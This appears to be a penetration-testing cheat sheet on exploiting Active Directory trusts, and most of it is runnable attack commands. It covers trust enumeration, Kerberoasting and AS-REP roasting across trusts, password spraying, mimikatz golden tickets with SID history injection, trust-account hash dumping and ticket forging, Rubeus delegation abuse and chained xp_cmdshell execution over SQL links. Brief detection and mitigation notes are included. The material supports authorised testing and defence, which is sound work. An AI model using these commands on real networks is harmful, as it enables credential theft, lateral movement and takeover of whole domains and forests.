# Domain Trust Exploitation

Enumerate and exploit trust relationships between domains and forests to move laterally across trust boundaries.
Trust attacks allow attackers to pivot between domains and forests, often bypassing security boundaries.

## Quick Reference

```powershell
# Enumerate trusts with PowerView
Get-DomainTrust
Get-ForestTrust

# Map trust relationships
Invoke-MapDomainTrust

# Kerberoast across trust
GetUserSPNs.py -target-domain TRUSTED.LOCAL domain.local/user:password
```

## Trust Types

| Trust Type | Description | Transitivity | Direction |
|------------|-------------|--------------|-----------|
| Parent-Child | Between parent and child domain in same forest | Transitive | Two-way |
| Tree-Root | Between root domains of trees in same forest | Transitive | Two-way |
| External | Between domains in different forests | Non-transitive | One-way or two-way |
| Forest | Between root domains of different forests | Transitive | One-way or two-way |
| Shortcut | Between child domains in same forest | Transitive | One-way or two-way |
| Realm | Between Windows domain and non-Windows Kerberos realm | Transitive or non-transitive | One-way or two-way |

## Enumeration

### PowerView Trust Enumeration

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Enumerate domain trusts
Get-DomainTrust

# Enumerate forest trusts
Get-ForestTrust

# Get detailed trust information
Get-DomainTrust -Domain domain.local

# Map all trusts
Invoke-MapDomainTrust

# Enumerate foreign group memberships
Get-DomainForeignGroupMember

# Enumerate foreign users
Get-DomainForeignUser
```

### Native Windows Commands

```cmd
# List domain trusts
nltest /domain_trusts

# List all trusts
nltest /domain_trusts /all_trusts

# Query specific domain
nltest /dsgetdc:domain.local /force

# PowerShell
Get-ADTrust -Filter *
```

### BloodHound Trust Mapping

```powershell
# Collect with SharpHound including trusts
.\SharpHound.exe -c All,Trusts --zipfilename bloodhound_trusts.zip

# In BloodHound, run queries:
# - Map Domain Trusts
# - Shortest Paths to Domain from Foreign Domain
# - Find Principals with DCSync Rights in Foreign Domain
```

## Cross-Domain Attacks

### Kerberoasting Across Trusts

```bash
# List SPNs in trusted domain
GetUserSPNs.py -target-domain TRUSTED.LOCAL domain.local/user:password

# Request TGS tickets
GetUserSPNs.py -target-domain TRUSTED.LOCAL domain.local/user:password -request

# Crack tickets
hashcat -m 13100 tgs_trusted.txt /usr/share/wordlists/rockyou.txt
```

### ASREP Roasting Across Trusts

```bash
# ASREP roast in trusted domain
GetNPUsers.py TRUSTED.LOCAL/ -dc-ip 10.10.10.20 -usersfile users.txt -no-pass

# With credentials
GetNPUsers.py TRUSTED.LOCAL/user:password -dc-ip 10.10.10.20 -request
```

### Password Spraying Across Trusts

```bash
# Spray passwords in trusted domain
nxc smb 10.10.20.0/24 -u users.txt -p 'Password123' -d TRUSTED.LOCAL --continue-on-success
```

## Parent-Child Trust Attacks

### ExtraSids Attack (SID History Injection)

```powershell
# Get child domain SID
Get-DomainSID

# Get parent domain SID
Get-DomainSID -Domain parent.local

# Create Golden Ticket with Enterprise Admins SID
.\mimikatz.exe
mimikatz # kerberos::golden /user:Administrator /domain:child.parent.local /sid:S-1-5-21-CHILD-SID /sids:S-1-5-21-PARENT-SID-519 /krbtgt:krbtgt_hash /ptt

# Access parent domain
dir \\parent-dc\c$
```

### Compromise Child to Compromise Parent

```
1. Compromise child domain
2. Extract krbtgt hash from child DC
3. Create Golden Ticket with Enterprise Admins SID
4. Access parent domain resources
5. DCSync parent domain
```

## Forest Trust Attacks

### Trust Account Attack

```bash
# Dump trust account password
secretsdump.py domain.local/user:password@dc.domain.local -just-dc-user 'TRUSTED$'

# Use trust account hash
getTGT.py TRUSTED.LOCAL/TRUSTED$ -hashes :trust_hash

# Request TGS for service in trusted forest
getST.py TRUSTED.LOCAL/TRUSTED$ -hashes :trust_hash -spn cifs/dc.trusted.local
```

### SID History Injection Across Forests

```powershell
# Requires compromised trust account
# Create ticket with SID history
.\mimikatz.exe
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-DOMAIN-SID /sids:S-1-5-21-TRUSTED-SID-500 /rc4:trust_hash /service:krbtgt /target:trusted.local /ptt
```

### Unconstrained Delegation Across Trusts

```powershell
# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained

# Monitor for TGTs
.\Rubeus.exe monitor /interval:5

# Coerce authentication from trusted domain
# Use printer bug or other coercion technique

# Extract TGT and use for access
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

## Foreign Security Principals

### Enumerate Foreign Principals

```powershell
# Find foreign group members
Get-DomainForeignGroupMember

# Find foreign users in local groups
Get-DomainGroupMember -Identity "Domain Admins" | ? {$_.MemberName -like '*S-1-5-21*'}

# Enumerate ACLs with foreign principals
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -match '^S-1-5-21-(?!CURRENT-DOMAIN-SID)'}
```

### Abuse Foreign Group Memberships

```
1. Identify user in trusted domain with admin rights in current domain
2. Compromise user in trusted domain
3. Use credentials to access current domain
4. Escalate privileges using group membership
```

## SQL Server Link Attacks Across Trusts

```sql
-- Enumerate SQL Server links
EXEC sp_linkedservers

-- Execute commands across link
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER]

-- Chain links across trusts
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [REMOTE_SERVER]') AT [LINKED_SERVER]
```

## Notes

### Trust Direction

- **One-way trust**: Domain A trusts Domain B
  - Users in B can access resources in A
  - Users in A cannot access resources in B
- **Two-way trust**: Domains trust each other
  - Users in both domains can access resources in the other

### Trust Transitivity

- **Transitive**: Trust extends beyond two domains
  - If A trusts B and B trusts C, then A trusts C
- **Non-transitive**: Trust limited to two domains
  - If A trusts B and B trusts C, A does NOT trust C

### SID Filtering

SID filtering prevents SID history attacks across forest trusts:
- Enabled by default on external trusts
- Disabled by default on forest trusts
- Can be bypassed with specific techniques (CVE-2020-0665)

### Common Attack Paths

**Scenario 1: Child to Parent**
```
1. Compromise child domain
2. Extract krbtgt hash
3. Create Golden Ticket with Enterprise Admins SID
4. Access parent domain
```

**Scenario 2: Forest to Forest**
```
1. Compromise user in Forest A
2. Kerberoast service accounts in Forest B
3. Crack service account password
4. Use service account for lateral movement in Forest B
```

**Scenario 3: Foreign Group Abuse**
```
1. Identify foreign security principal with admin rights
2. Compromise account in trusted domain
3. Use credentials to access current domain
4. Escalate privileges
```

### Detection

Trust attacks generate:
- Event ID 4768 (TGT requested) from foreign domain
- Event ID 4769 (TGS requested) for foreign domain services
- Event ID 4624 (Logon) from foreign domain users
- Unusual cross-domain authentication patterns
- SID history in tickets (Event ID 4769)

### Mitigation Recommendations

For clients:
- Minimize trust relationships
- Use selective authentication on forest trusts
- Enable SID filtering on external trusts
- Monitor cross-domain authentication
- Implement tiered administration across trusts
- Regular trust audits
- Disable unconstrained delegation
- Use Protected Users group
- Implement network segmentation between forests
- Monitor Event IDs 4768, 4769, 4624 for cross-domain activity

### Trust Security Boundaries

- **Forest is the security boundary**, not the domain
- Compromising any domain in a forest = compromising entire forest
- Forest trusts should be treated as high-risk
- External trusts are more secure than forest trusts (SID filtering)

### BloodHound Trust Queries

```cypher
// Find shortest path from current domain to foreign domain
MATCH p=shortestPath((u:User {domain:"CURRENT.LOCAL"})-[*1..]->(g:Group {domain:"TRUSTED.LOCAL"}))
RETURN p

// Find foreign admins
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@TRUSTED.LOCAL"})
WHERE u.domain <> "TRUSTED.LOCAL"
RETURN u

// Find cross-domain ACLs
MATCH p=(u:User)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(n)
WHERE u.domain <> n.domain
RETURN p
```

### Resources

- [Harmj0y - A Guide to Attacking Domain Trusts](https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d)
- [HTB Academy - Active Directory Trust Attacks](https://academy.hackthebox.com/module/details/147)
- [SpecterOps - Not A Security Boundary: Breaking Forest Trusts](https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d)
